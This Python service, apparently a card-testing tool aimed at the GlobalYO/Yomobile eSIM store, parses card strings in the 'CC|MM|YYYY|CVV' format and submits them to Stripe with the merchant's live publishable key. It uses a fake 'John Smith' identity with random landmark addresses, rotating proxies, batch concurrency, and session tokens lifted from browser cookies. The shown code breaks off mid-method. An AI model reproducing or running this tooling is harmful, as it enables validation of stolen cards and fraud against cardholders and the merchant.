#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════════════
# main-yo-api.py — Yomobile API Runner v1.9.0
# ✅ JWT-aware session refresh (no more 15-min expiry issues)
# ✅ Proactive renewal + 401-retry + background refresh loop
# ✅ 308 Redirect fix (trailing slash removal)
# ✅ Egypt hardcoded, pk-only Stripe tokenization
# ═══════════════════════════════════════════════════════════════════════════

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import logging
import os
import random
import re
import time
import uuid
from collections import Counter, deque
from contextlib import asynccontextmanager
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import httpx
import uvicorn
from fastapi import FastAPI, HTTPException, Query as FastQuery, Request
from fastapi.responses import JSONResponse


# ═══════════════════════════════════════════════════════════════════════════
# Logging
# ═══════════════════════════════════════════════════════════════════════════
logger = logging.getLogger("yomobile_api")
if not logger.handlers:
    logging.basicConfig(
        level=getattr(logging, os.environ.get("LOG_LEVEL", "INFO").upper(), logging.INFO),
        format="%(asctime)s - %(levelname)s - %(message)s",
    )


# ═══════════════════════════════════════════════════════════════════════════
# ⚙️ CONFIG — التوكنات الجديدة مضمّنة من كوكيزك
# ═══════════════════════════════════════════════════════════════════════════
_FIXED_CONFIG = {
    # ── 🔑 الجلسة (من كوكيز متصفحك) ──────────────────────────────────────
    "AUTH_TOKEN": (
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9."
        "eyJpYXQiOjE3OTM5ODkwNzcsImV4cCI6MTc5Mzk4OTk3Nywic2Vzc2lvbl9pZCI6ImUxMzU0"
        "Y2U3LWY5ODYtNGM1ZC1hYjk2LTg5ZWZmNGUzYTc1ZCIsInNhbHQiOiJCd1JLekdYaiJ9."
        "gQIU3ZH5Yt2NYZhdEMd_NQ-_4oDV1SLRy4Czx4eQ9yl1D9fBHci6-4fi9a7PjEKBLW0YtoCQ"
        "GzGk92wHBG1pd2HUXZPRxnLRU10pdNd9BT2XmLZ9PTRAO-FB24ZkIId-Hmu3qnTp11ZrnNt1s"
        "BZPC3VQg5H-yCzJ72ZF3NmYk7rm1RIT6y62beOZ_q9KAoXzb5A-em1d9uud1ptMZD_dy8X5YO"
        "RjW9V_gInN8542oVz4EHVFiCT3ua5kjrHbJW9o9Hhowp_f6floOkUY9KSvJeu6TUOnzLBiRUZ"
        "JLOeu_jqW6_MS6UZdvv5qy4nujatqINxPvijsD_vwZkm0X2TFTQ"
    ),
    "REFRESH_TOKEN": (
        "9KToEk0JKWSCDwOLmfBGdwTLL632PGCDKQrUJ29UtGPR3YIPYGMppf1X8hIWGmwL"
    ),
    "DEVICE_ID": "97de4f52-6b25-4977-ad4e-5d5481574062",
    "CUSTOMER_PROFILE_ID": "",
    "CUSTOMER_HASH_EMAIL": "",
    "STRIPE_ORDER_ID": "",

    # ── 💳 Stripe (pk فقط) ───────────────────────────────────────────────
    "STRIPE_PUBLISHABLE_KEY": (
        "pk_live_51LVdJtLeiF50tx6reJrhWFBcVdwMfouS1zw0cag4uUNiTKz13hUE9yIRV4LwuJ"
        "MZHUAvxTJT862K0uHENSJ4TF3i00NKSjSaaR"
    ),
    "STRIPE_PAYMENT_INTENT_ID": "pi_3UXrnnLeiF50tx6r12FEbYyC",
    "STRIPE_PAYMENT_METHOD_ID": "pm_1UXrqmLeiF50tx6rc2Q1zNrZ",
    "STRIPE_MERCHANT": "acct_1LVdJtLeiF50tx6r",
    "STRIPE_PAYATT": "payatt_3UXrnnLeiF50tx6r11CJI9HE",

    # ── 🇪🇬 مصر ─────────────────────────────────────────────────────────
    "AUTO_COUNTRY": "EG",
    "AUTO_RESOLVE": "false",
    "EG_COUNTRY_ID": "6ba74ed8-4287-470b-815a-929295ba5d0b",
    "EG_PRODUCT_ID": "65fdbc27-d0f2-4144-9b16-9c1003711f98",
    "AUTO_CACHE_TTL": "3600",
    "PRODUCTS_TTL": "300",

    # ── 👤 هوية ثابتة ───────────────────────────────────────────────────
    "FIXED_EMAIL": "john.smith.orders@gmail.com",
    "FIXED_FIRST_NAME": "John",
    "FIXED_LAST_NAME": "Smith",

    # ── 🌐 URLs ──────────────────────────────────────────────────────────
    "BASE_URL": "https://play.prod.yomobile.xyz",
    "STORE_URL": "https://www.globalyo.com",
    "STRIPE_URL": "https://api.stripe.com",

    # ── ⚙️ الأداء + التجديد ─────────────────────────────────────────────
    "USE_STORE_PROXY": "true",
    "SESSION_TTL": "900",
    "SESSION_REFRESH_MARGIN": "180",   # ⭐ جدّد قبل 180s من الانتهاء
    "SESSION_LOOP_INTERVAL": "60",     # ⭐ افحص كل 60s
    "REQUEST_TIMEOUT": "60",
    "RETRY_COUNT": "2",
    "RETRY_DELAY": "1.0",
    "HTTP2_ENABLED": "true",
    "MAX_CONCURRENCY": "100",
    "BATCH_CONCURRENCY": "5",

    # ── 🔌 بروكسي ────────────────────────────────────────────────────────
    "PROXY_FILE": "",
    "CB_THRESHOLD": "5",
    "CB_COOLDOWN": "300",

    # ── 📝 مخرجات ────────────────────────────────────────────────────────
    "LOG_LEVEL": "INFO",
    "OUTPUT_DIR": "yo_runs",
    "PORT": "8000",
}


def _v(key: str, default: str = "") -> str:
    return os.environ.get(key, _FIXED_CONFIG.get(key, default))


def _vb(key: str, default: str = "true") -> bool:
    return _v(key, default).lower() in ("1", "true", "yes", "on")


# ═══════════════════════════════════════════════════════════════════════════
# Config
# ═══════════════════════════════════════════════════════════════════════════
BASE_URL = _v("BASE_URL")
STORE_URL = _v("STORE_URL")
STRIPE_URL = _v("STRIPE_URL")

USE_STORE_PROXY = _vb("USE_STORE_PROXY")

AUTO_COUNTRY = _v("AUTO_COUNTRY", "EG").upper()
AUTO_RESOLVE = _vb("AUTO_RESOLVE", "false")
AUTO_CACHE_TTL = int(_v("AUTO_CACHE_TTL", "3600"))
PRODUCTS_TTL = int(_v("PRODUCTS_TTL", "300"))

EG_COUNTRY_ID = _v("EG_COUNTRY_ID")
EG_PRODUCT_ID = _v("EG_PRODUCT_ID")

STRIPE_PUBLISHABLE_KEY = _v("STRIPE_PUBLISHABLE_KEY")
STRIPE_PAYMENT_INTENT_ID = _v("STRIPE_PAYMENT_INTENT_ID")
STRIPE_PAYMENT_METHOD_ID = _v("STRIPE_PAYMENT_METHOD_ID")
STRIPE_MERCHANT = _v("STRIPE_MERCHANT")
STRIPE_PAYATT = _v("STRIPE_PAYATT")

FIXED_EMAIL = _v("FIXED_EMAIL")
FIXED_FIRST_NAME = _v("FIXED_FIRST_NAME")
FIXED_LAST_NAME = _v("FIXED_LAST_NAME")

REQUEST_TIMEOUT = float(_v("REQUEST_TIMEOUT", "60"))
RETRY_COUNT = int(_v("RETRY_COUNT", "2"))
RETRY_DELAY = float(_v("RETRY_DELAY", "1.0"))
HTTP2_ENABLED = _vb("HTTP2_ENABLED")
PROXY_FILE = _v("PROXY_FILE")
CB_THRESHOLD = int(_v("CB_THRESHOLD", "5"))
CB_COOLDOWN = float(_v("CB_COOLDOWN", "300"))
MAX_CONCURRENCY = int(_v("MAX_CONCURRENCY", "100"))
BATCH_CONCURRENCY = int(_v("BATCH_CONCURRENCY", "5"))
OUTPUT_DIR = _v("OUTPUT_DIR", "yo_runs")
SESSION_TTL = float(_v("SESSION_TTL", "900"))
SESSION_REFRESH_MARGIN = int(_v("SESSION_REFRESH_MARGIN", "180"))
SESSION_LOOP_INTERVAL = int(_v("SESSION_LOOP_INTERVAL", "60"))

AUTH_BEARER = ""
STRIPE_AUTH = ""
FIREBASE_APP_CHECK = ""
APP_ATTESTATION = "valid"
STRIPE_CUSTOMER_ID = ""
STRIPE_PAYMENT_INTENT_SECRET = ""
ESIM_ORDER_ID = ""
ESIM_PRODUCT_ID = EG_PRODUCT_ID
ESIM_COUNTRY_ID = EG_COUNTRY_ID
DEVICE_ID = ""
CUSTOMER_EMAIL = ""
CUSTOMER_FIRST_NAME = ""
CUSTOMER_LAST_NAME = ""
SYNC_SINCE = ""
API_KEY = ""


# ═══════════════════════════════════════════════════════════════════════════
# ⭐ JWT utilities — قراءة exp بدون تحقق من التوقيع
# ═══════════════════════════════════════════════════════════════════════════
def _jwt_exp(token: str) -> Optional[int]:
    """استخراج exp claim من JWT (بدون تحقق)."""
    if not token:
        return None
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload_b64 = parts[1]
        padding = "=" * (4 - len(payload_b64) % 4)
        decoded = base64.urlsafe_b64decode(payload_b64 + padding)
        payload = json.loads(decoded)
        exp = payload.get("exp")
        return int(exp) if exp else None
    except Exception:
        return None


def _jwt_remaining(token: str) -> int:
    """ثواني متبقية قبل انتهاء التوكن (0 إذا منتهي)."""
    exp = _jwt_exp(token)
    if not exp:
        return 0
    return max(0, exp - int(time.time()))


def _jwt_is_valid(token: str, margin_sec: int = 120) -> bool:
    """هل التوكن صالح مع هامش أمان؟"""
    exp = _jwt_exp(token)
    if not exp:
        return False
    return time.time() + margin_sec < exp


# ═══════════════════════════════════════════════════════════════════════════
# Address book
# ═══════════════════════════════════════════════════════════════════════════
ADDRESS_BOOK: Dict[str, List[Dict[str, str]]] = {
    "EG": [
        {"address1": "15 Nile Corniche", "city": "Cairo", "state": "C", "postal_code": "11511", "country": "EG", "phone": "20225755000"},
        {"address1": "10 Tahrir Square", "city": "Cairo", "state": "C", "postal_code": "11513", "country": "EG", "phone": "20225763422"},
        {"address1": "5 El Geish Road", "city": "Alexandria", "state": "ALX", "postal_code": "21519", "country": "EG", "phone": "2034870000"},
    ],
    "US": [
        {"address1": "350 Fifth Avenue", "city": "New York", "state": "NY", "postal_code": "10118", "country": "US", "phone": "2125550100"},
        {"address1": "233 S Wacker Dr", "city": "Chicago", "state": "IL", "postal_code": "60606", "country": "US", "phone": "3125550147"},
    ],
    "GB": [
        {"address1": "221B Baker Street", "city": "London", "state": "ENG", "postal_code": "NW1 6XE", "country": "GB", "phone": "2079460123"},
    ],
    "AE": [
        {"address1": "Burj Khalifa Tower", "city": "Dubai", "state": "DU", "postal_code": "00000", "country": "AE", "phone": "97143231234"},
    ],
    "DEFAULT": [
        {"address1": "15 Nile Corniche", "city": "Cairo", "state": "C", "postal_code": "11511", "country": "EG", "phone": "20225755000"},
    ],
}


def _detect_country_from_card(card_number: str) -> str:
    if not card_number or len(card_number) < 4:
        return "EG"
    prefix4 = card_number[:4]
    if prefix4 in {"4000", "4001", "4002", "4003", "4004", "4005"}:
        return "GB"
    if prefix4 in {"4500", "4501", "4502", "4503", "4504", "4505"}:
        return "US"
    if prefix4 in {"5100", "5101", "5102", "5103", "5104", "5105"}:
        return "US"
    return "EG"


def _pick_address(country: Optional[str] = None) -> Dict[str, str]:
    cc = (country or "EG").upper()
    entries = ADDRESS_BOOK.get(cc) or ADDRESS_BOOK["DEFAULT"]
    return dict(random.choice(entries))


# ═══════════════════════════════════════════════════════════════════════════
# Card parsing
# ═══════════════════════════════════════════════════════════════════════════
_CC_SPLIT = re.compile(r"[|/,]")


def parse_cc_string(cc_string: str) -> Dict[str, str]:
    if not cc_string or not isinstance(cc_string, str):
        raise ValueError("Empty or non-string card")
    parts = [p.strip() for p in _CC_SPLIT.split(cc_string) if p.strip()]
    if len(parts) != 4:
        raise ValueError("Invalid card format. Use: CC|MM|YYYY|CVV")
    cc, mes, ano, cvv = parts
    digits = re.sub(r"\D", "", cc)
    if not digits or len(digits) < 12 or len(digits) > 19:
        raise ValueError("Invalid card number length")
    if not mes.isdigit() or not (1 <= int(mes) <= 12):
        raise ValueError("Invalid month")
    if not ano.isdigit() or len(ano) not in (2, 4):
        raise ValueError("Invalid year (2 or 4 digits)")
    if len(ano) == 2:
        ano = "20" + ano
    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        raise ValueError("Invalid CVV")
    return {"cc": digits, "mes": mes.zfill(2), "ano": ano, "cvv": cvv}


def _check_auth(request: Optional[Request]) -> None:
    if not API_KEY:
        return
    if request is None:
        raise HTTPException(status_code=401, detail="Missing request")
    provided = request.headers.get("X-API-Key", "") or request.query_params.get("api_key", "")
    if not hmac.compare_digest(provided, API_KEY):
        raise HTTPException(status_code=401, detail="Invalid API key")


# ═══════════════════════════════════════════════════════════════════════════
# Headers
# ═══════════════════════════════════════════════════════════════════════════
WEB_UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.2 Mobile/15E148 Safari/604.1"
IOS_UA = "Global YO/5.6.0 (com.yoverse.core; build:1612; iOS 27.2.0) Alamofire/5.12.0"

BASE_HEADERS: Dict[str, str] = {
    "Accept": "application/json, text/plain, */*",
    "X-Device-Client-Name": "iOS",
    "X-Device-Os-Version": "Version 27.2 (Build 24B120)",
    "X-Device-Client-Version": "5.6.0(1612)",
    "X-Device-Model": "iPhone12,1",
    "X-Platform": "yoverse",
    "User-Agent": IOS_UA,
    "Accept-Language": "ar-EG;q=1.0, en-EG;q=0.9",
    "Connection": "keep-alive",
}

WEB_HEADERS: Dict[str, str] = {
    "Accept": "application/json, text/plain, */*",
    "X-Platform": "yoverse",
    "User-Agent": WEB_UA,
    "Accept-Language": "ar",
    "Origin": STORE_URL,
    "Referer": f"{STORE_URL}/",
    "Connection": "keep-alive",
}


# ═══════════════════════════════════════════════════════════════════════════
# Metrics
# ═══════════════════════════════════════════════════════════════════════════
_METRICS = Counter({
    "total": 0, "success": 0, "failed": 0,
    "runs": 0, "single_runs": 0, "proxy_errors": 0,
    "session_refresh": 0, "session_fail": 0,
    "session_401_retry": 0,
    "stripe_tokenize_ok": 0, "stripe_tokenize_fail": 0,
    "payment_tok": 0, "payment_pm": 0, "payment_sheet": 0,
})
_LATENCIES: deque = deque(maxlen=2000)
_METRICS_LOCK = asyncio.Lock()


# ═══════════════════════════════════════════════════════════════════════════
# Proxy helpers
# ═══════════════════════════════════════════════════════════════════════════
def _norm_proxy(s: Optional[str]) -> Optional[str]:
    if not s:
        return None
    s = s.strip()
    if s.lower() in ("direct", "none", "noproxy"):
        return None
    if s.startswith(("http://", "https://", "socks5://", "socks5h://",
                     "socks4://", "socks4a://")):
        return s
    if "@" in s:
        return f"http://{s}"
    parts = s.split(":")
    if len(parts) == 2 and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4 and parts[1].isdigit():
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 3 and parts[1].isdigit():
        return f"http://{parts[2]}@{parts[0]}:{parts[1]}"
    return None


def _mask_proxy(proxy: Optional[str]) -> str:
    if not proxy:
        return "direct"
    try:
        if "@" in proxy:
            scheme_part, host_part = proxy.rsplit("@", 1)
            if "://" in scheme_part:
                scheme, auth = scheme_part.split("://", 1)
            else:
                scheme, auth = "http", scheme_part
            if ":" in auth:
                user = auth.split(":")[0]
                return f"{scheme}://{user[:3]}***@{host_part}"
        return proxy
    except Exception:
        return "***"


def _load_proxies(path: str) -> List[str]:
    if not path or not os.path.exists(path):
        return []
    proxies: List[str] = []
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                p = _norm_proxy(line)
                if p:
                    proxies.append(p)
    except Exception as e:
        logger.warning(f"Failed to load proxy pool: {e}")
    return proxies


# ═══════════════════════════════════════════════════════════════════════════
# ProxyStats + Circuit Breaker + Rotator
# ═══════════════════════════════════════════════════════════════════════════
@dataclass
class ProxyStats:
    success: int = 0
    fail: int = 0
    consecutive_fails: int = 0
    total_ms: int = 0
    last_fail_ts: float = 0.0


class ProxyCircuitBreaker:
    def __init__(self, threshold: int = 5, cooldown: float = 300.0):
        self.threshold = threshold
        self.cooldown = cooldown
        self.stats: Dict[str, ProxyStats] = {}
        self.dead_until: Dict[str, float] = {}
        self.lock = asyncio.Lock()

    async def record_success(self, proxy: Optional[str], elapsed_ms: int = 0) -> None:
        if not proxy:
            return
        async with self.lock:
            s = self.stats.setdefault(proxy, ProxyStats())
            s.success += 1
            s.consecutive_fails = 0
            s.total_ms += elapsed_ms
            self.dead_until.pop(proxy, None)

    async def record_fail(self, proxy: Optional[str], elapsed_ms: int = 0) -> None:
        if not proxy:
            return
        async with self.lock:
            s = self.stats.setdefault(proxy, ProxyStats())
            s.fail += 1
            s.consecutive_fails += 1
            s.last_fail_ts = time.time()
            s.total_ms += elapsed_ms
            if s.consecutive_fails >= self.threshold:
                self.dead_until[proxy] = time.time() + self.cooldown

    async def is_healthy(self, proxy: str) -> bool:
        async with self.lock:
            until = self.dead_until.get(proxy, 0.0)
            if until > time.time():
                return False
            self.dead_until.pop(proxy, None)
            return True

    def score(self, proxy: str) -> float:
        s = self.stats.get(proxy)
        if not s or (s.success + s.fail) == 0:
            return 0.5
        return s.success / (s.success + s.fail)

    def snapshot(self) -> Dict[str, Dict[str, Any]]:
        now = time.time()
        out: Dict[str, Dict[str, Any]] = {}
        for p in self.stats:
            s = self.stats[p]
            until = self.dead_until.get(p, 0.0)
            remaining = max(0, int(until - now)) if until > now else 0
            out[p] = {
                "success": s.success, "fail": s.fail,
                "consecutive_fails": s.consecutive_fails,
                "score": round(self.score(p), 3),
                "avg_ms": int(s.total_ms / (s.success + s.fail)) if (s.success + s.fail) else 0,
                "dead": remaining > 0,
                "cooldown_remaining_sec": remaining,
            }
        return out


class ProxyRotator:
    def __init__(self, proxies: List[str], cb: ProxyCircuitBreaker, sticky: bool = True):
        self.proxies = list(proxies)
        self.cb = cb
        self.sticky_enabled = sticky
        self.sticky: Dict[str, str] = {}
        self.sticky_ts: Dict[str, float] = {}
        self.index = 0
        self.lock = asyncio.Lock()

    @property
    def has_proxies(self) -> bool:
        return bool(self.proxies)

    async def pick(self, session_id: Optional[str] = None,
                   exclude: Optional[str] = None) -> Optional[str]:
        if not self.proxies:
            return None
        async with self.lock:
            if self.sticky_enabled and session_id and session_id in self.sticky:
                p = self.sticky[session_id]
                if p != exclude and await self.cb.is_healthy(p):
                    return p
                self.sticky.pop(session_id, None)
                self.sticky_ts.pop(session_id, None)
            healthy: List[str] = []
            for p in self.proxies:
                if p == exclude:
                    continue
                if await self.cb.is_healthy(p):
                    healthy.append(p)
            if not healthy:
                candidates = [p for p in self.proxies if p != exclude] or self.proxies
                healthy = sorted(candidates, key=self.cb.score, reverse=True)[:1]
                if not healthy:
                    return None
            healthy.sort(key=self.cb.score, reverse=True)
            top_n = max(1, len(healthy) // 3)
            top = healthy[:top_n]
            chosen = top[self.index % len(top)]
            self.index += 1
            if self.sticky_enabled and session_id:
                self.sticky[session_id] = chosen
                self.sticky_ts[session_id] = time.time()
            return chosen

    async def release(self, session_id: str) -> None:
        async with self.lock:
            self.sticky.pop(session_id, None)
            self.sticky_ts.pop(session_id, None)

    async def cleanup_stale(self, max_age: float = 300.0) -> None:
        now = time.time()
        async with self.lock:
            stale = [k for k, ts in self.sticky_ts.items() if now - ts > max_age]
            for k in stale:
                self.sticky.pop(k, None)
                self.sticky_ts.pop(k, None)


# ═══════════════════════════════════════════════════════════════════════════
# HTTP client
# ═══════════════════════════════════════════════════════════════════════════
_http_client: Optional[httpx.AsyncClient] = None
_client_lock = asyncio.Lock()


async def _get_client() -> httpx.AsyncClient:
    global _http_client
    if _http_client is None or _http_client.is_closed:
        async with _client_lock:
            if _http_client is None or _http_client.is_closed:
                try:
                    _http_client = httpx.AsyncClient(
                        timeout=REQUEST_TIMEOUT, http2=HTTP2_ENABLED,
                        follow_redirects=True,
                    )
                except Exception:
                    _http_client = httpx.AsyncClient(
                        timeout=REQUEST_TIMEOUT, follow_redirects=True,
                    )
    return _http_client


async def _close_client() -> None:
    global _http_client
    if _http_client is not None:
        try:
            await _http_client.aclose()
        except Exception:
            pass
        _http_client = None


def _get_http_client_for_proxy(
    proxy: Optional[str],
    cache: Dict[str, httpx.AsyncClient],
) -> httpx.AsyncClient:
    if proxy is None:
        return _http_client  # type: ignore
    if proxy in cache:
        return cache[proxy]
    client: Optional[httpx.AsyncClient] = None
    try:
        client = httpx.AsyncClient(timeout=REQUEST_TIMEOUT, http2=HTTP2_ENABLED,
                                    follow_redirects=True, proxy=proxy)
    except TypeError:
        try:
            client = httpx.AsyncClient(timeout=REQUEST_TIMEOUT, http2=HTTP2_ENABLED,
                                        follow_redirects=True, proxies={"all://": proxy})
        except TypeError:
            client = httpx.AsyncClient(timeout=REQUEST_TIMEOUT, follow_redirects=True,
                                        proxies=proxy)  # type: ignore
    cache[proxy] = client
    return client


# ═══════════════════════════════════════════════════════════════════════════
# Cookies helpers
# ═══════════════════════════════════════════════════════════════════════════
def _extract_response_cookies(resp: httpx.Response) -> Dict[str, str]:
    out: Dict[str, str] = {}
    try:
        for cookie in resp.cookies.jar:
            out[cookie.name] = cookie.value
    except Exception:
        pass
    return out


def _order_id_from_body(body: Any) -> Optional[str]:
    if not isinstance(body, dict):
        return None
    for key in ("id", "order_id", "orderId", "uuid", "stripe_order_id"):
        v = body.get(key)
        if isinstance(v, str) and v:
            return v
    for sub in ("order", "data", "result"):
        nested = body.get(sub)
        if isinstance(nested, dict):
            got = _order_id_from_body(nested)
            if got:
                return got
    return None


# ═══════════════════════════════════════════════════════════════════════════
# Session Manager (JWT-aware)
# ═══════════════════════════════════════════════════════════════════════════
class SessionManager:
    def __init__(self):
        self.auth_token: str = ""
        self.refresh_token: str = ""
        self.device_id: str = ""
        self.customer_profile_id: str = ""
        self.customer_hash_email: str = ""
        self.stripe_order_id: str = ""
        self.updated_at: float = 0.0
        self.last_refresh_attempt: float = 0.0
        self.lock = asyncio.Lock()

    def is_fresh(self) -> bool:
        """يعتمد على exp الحقيقي للـ JWT مع هامش أمان."""
        if not self.auth_token:
            return False
        return _jwt_is_valid(self.auth_token, margin_sec=SESSION_REFRESH_MARGIN)

    def token_remaining(self) -> int:
        return _jwt_remaining(self.auth_token) if self.auth_token else 0

    def cookie_header(self, extra: Optional[Dict[str, str]] = None) -> str:
        parts: List[str] = []
        if self.auth_token:
            parts.append(f"auth_token={self.auth_token}")
        if self.refresh_token:
            parts.append(f"refresh_token={self.refresh_token}")
        if self.device_id:
            parts.append(f"device_id={self.device_id}")
        if self.customer_profile_id:
            parts.append(f"customer_profile_id={self.customer_profile_id}")
        if self.customer_hash_email:
            parts.append(f"customer_hash_email={self.customer_hash_email}")
        if self.stripe_order_id:
            parts.append(f"stripe_order_id={self.stripe_order_id}")
        parts.append("current_locale=en")
        parts.append("is_international_calls_included=false")
        if extra:
            for k, v in extra.items():
                if v:
                    parts.append(f"{k}={v}")
        return "; ".join(parts)

    def update_from_cookies(self, cookies: Dict[str, str]) -> None:
        for key in ("auth_token", "refresh_token", "device_id",
                    "customer_profile_id", "customer_hash_email", "stripe_order_id"):
            if cookies.get(key):
                setattr(self, key, cookies[key])
        self.updated_at = time.time()

    def set_stripe_order_id(self, order_id: str) -> None:
        if order_id:
            self.stripe_order_id = order_id

    def invalidate(self) -> None:
        """إبطال التوكن لإجبار تجديده."""
        self.auth_token = ""
        self.updated_at = 0.0


_session = SessionManager()


async def _init_session_from_config() -> None:
    """تحميل القيم من _FIXED_CONFIG (يُستدعى عند الإقلاع)."""
    async with _session.lock:
        _session.auth_token = _v("AUTH_TOKEN") or ""
        _session.refresh_token = _v("REFRESH_TOKEN") or ""
        _session.device_id = _v("DEVICE_ID") or str(uuid.uuid4())
        _session.customer_profile_id = _v("CUSTOMER_PROFILE_ID") or ""
        _session.customer_hash_email = _v("CUSTOMER_HASH_EMAIL") or ""
        _session.stripe_order_id = _v("STRIPE_ORDER_ID") or ""
        _session.updated_at = time.time() if _session.auth_token else 0.0

    if _session.auth_token:
        remaining = _jwt_remaining(_session.auth_token)
        exp = _jwt_exp(_session.auth_token)
        logger.info(
            f"[SESSION] loaded from config: auth=yes | "
            f"device={_session.device_id[:8]}... | "
            f"exp_remaining={remaining}s | "
            f"has_refresh={'yes' if _session.refresh_token else 'no'}"
        )
        if remaining <= 0:
            logger.warning("[SESSION] ⚠️ AUTH_TOKEN منتهي! سيجدد عبر refresh_token تلقائيًا")
    else:
        logger.warning(
            "[SESSION] AUTH_TOKEN فارغ — عدّله في _FIXED_CONFIG['AUTH_TOKEN']"
        )


async def _fetch_session(
    client: httpx.AsyncClient,
    cookie_header: str = "",
    force: bool = False,
) -> Tuple[bool, str]:
    """
    تجديد الجلسة عبر /api/storefront/auth/session.
    يتحقق فعليًا من أن التوكن الجديد مختلف وصالح.
    """
    if not USE_STORE_PROXY:
        return True, ""

    # منع المحاولات المتكررة في وقت قصير جدًا
    now = time.time()
    if not force and (now - _session.last_refresh_attempt) < 5:
        return _session.is_fresh(), "throttled"

    _session.last_refresh_attempt = now

    url = f"{STORE_URL}/api/storefront/auth/session"
    headers = dict(WEB_HEADERS)
    headers["Pragma"] = "no-cache"
    headers["Cache-Control"] = "no-cache"
    headers["Sec-Fetch-Site"] = "same-origin"
    headers["Sec-Fetch-Mode"] = "cors"
    headers["Sec-Fetch-Dest"] = "empty"
    if cookie_header:
        headers["Cookie"] = cookie_header

    old_token = _session.auth_token
    old_hash = hashlib.sha256(old_token.encode()).hexdigest()[:16] if old_token else ""

    try:
        resp = await client.get(url, headers=headers)
        if resp.status_code not in (200, 201):
            async with _METRICS_LOCK:
                _METRICS["session_fail"] += 1
            logger.warning(f"[SESSION] refresh HTTP {resp.status_code}")
            return False, f"HTTP {resp.status_code}"

        cookies = _extract_response_cookies(resp)
        if not cookies:
            async with _METRICS_LOCK:
                _METRICS["session_fail"] += 1
            return False, "no cookies in response"

        _session.update_from_cookies(cookies)

        new_token = _session.auth_token
        new_hash = hashlib.sha256(new_token.encode()).hexdigest()[:16] if new_token else ""

        # تحقق 1: هل تغيّر التوكن؟
        if old_hash and new_hash == old_hash:
            logger.warning(f"[SESSION] server returned SAME token (hash={new_hash})")
            return False, "same token returned"

        # تحقق 2: هل التوكن الجديد صالح؟
        if not _jwt_is_valid(new_token, margin_sec=30):
            remaining = _jwt_remaining(new_token)
            logger.warning(f"[SESSION] new token still expired! (remaining={remaining}s)")
            return False, "new token expired"

        remaining = _jwt_remaining(new_token)
        async with _METRICS_LOCK:
            _METRICS["session_refresh"] += 1
        logger.info(f"[SESSION] ✅ refreshed | hash={new_hash} | remaining={remaining}s")
        return True, ""

    except Exception as e:
        async with _METRICS_LOCK:
            _METRICS["session_fail"] += 1
        return False, f"{type(e).__name__}: {str(e)[:80]}"


async def _ensure_session(client: httpx.AsyncClient, force: bool = False) -> bool:
    """ضمان جلسة صالحة (مع تجديد استباقي)."""
    if not USE_STORE_PROXY:
        return True
    async with _session.lock:
        if not force and _session.is_fresh():
            return True
        ok, err = await _fetch_session(
            client,
            cookie_header=_session.cookie_header(),
            force=force,
        )
        if not ok:
            logger.warning(f"[SESSION] ensure failed: {err}")
        return ok


# ═══════════════════════════════════════════════════════════════════════════
# Stripe Tokenization بـ pk
# ═══════════════════════════════════════════════════════════════════════════
async def stripe_tokenize_pk(
    client: httpx.AsyncClient,
    card_number: str,
    exp_month: str,
    exp_year: str,
    cvc: str,
    name: str = "",
) -> Tuple[Optional[str], Optional[str]]:
    if not STRIPE_PUBLISHABLE_KEY:
        return None, "no publishable key"
    url = f"{STRIPE_URL}/v1/tokens"
    headers = {
        "Authorization": f"Bearer {STRIPE_PUBLISHABLE_KEY}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
    }
    form = {
        "card[number]": str(card_number),
        "card[exp_month]": str(exp_month),
        "card[exp_year]": str(exp_year),
        "card[cvc]": str(cvc),
    }
    if name:
        form["card[name]"] = name
    try:
        resp = await client.post(url, headers=headers, data=form)
        body: Any = {}
        try:
            body = resp.json()
        except Exception:
            pass
        if resp.status_code == 200 and isinstance(body, dict):
            tok = body.get("id", "")
            if isinstance(tok, str) and tok.startswith("tok_"):
                async with _METRICS_LOCK:
                    _METRICS["stripe_tokenize_ok"] += 1
                logger.info(f"[STRIPE-PK] tokenized → {tok[:15]}...")
                return tok, None
            async with _METRICS_LOCK:
                _METRICS["stripe_tokenize_fail"] += 1
            return None, f"unexpected: {tok}"
        err_obj = body.get("error", {}) if isinstance(body, dict) else {}
        err_msg = err_obj.get("message") or body.get("message") or f"HTTP {resp.status_code}"
        async with _METRICS_LOCK:
            _METRICS["stripe_tokenize_fail"] += 1
        logger.warning(f"[STRIPE-PK] failed: {err_msg}")
        return None, str(err_msg)[:120]
    except Exception as e:
        async with _METRICS_LOCK:
            _METRICS["stripe_tokenize_fail"] += 1
        return None, f"{type(e).__name__}: {str(e)[:80]}"


# ═══════════════════════════════════════════════════════════════════════════
# YoQuery (308 fix)
# ═══════════════════════════════════════════════════════════════════════════
@dataclass(frozen=True)
class YoQuery:
    name: str
    method: str
    path: str
    needs_auth: bool = False
    json_body: Optional[Dict[str, Any]] = None
    params: Optional[Dict[str, str]] = None
    form_body: Optional[Dict[str, str]] = None
    base_is_stripe: bool = False
    use_stripe_auth: bool = False
    destructive: bool = False
    via_store_proxy: bool = False

    def url(self, ctx: Dict[str, str]) -> str:
        if self.base_is_stripe:
            base = ctx["stripe_url"]
            return self.path if self.path.startswith("http") else base + self.path
        if self.via_store_proxy and USE_STORE_PROXY:
            store = ctx.get("store_url") or STORE_URL
            p = self.path if self.path.startswith("/") else "/" + self.path
            # إزالة trailing slash لمنع 308 redirect
            if len(p) > 1 and p.endswith("/"):
                p = p.rstrip("/")
            return f"{store}/api/storefront/proxy{p}"
        base = ctx["base_url"]
        return self.path if self.path.startswith("http") else base + self.path

    def headers(self, ctx: Dict[str, str]) -> Dict[str, str]:
        if self.use_stripe_auth:
            token = ctx.get("stripe_auth") or STRIPE_PUBLISHABLE_KEY
            if not token:
                raise ValueError(f"Stripe key required for '{self.name}'")
            h = {**BASE_HEADERS, "Authorization": f"Bearer {token}"}
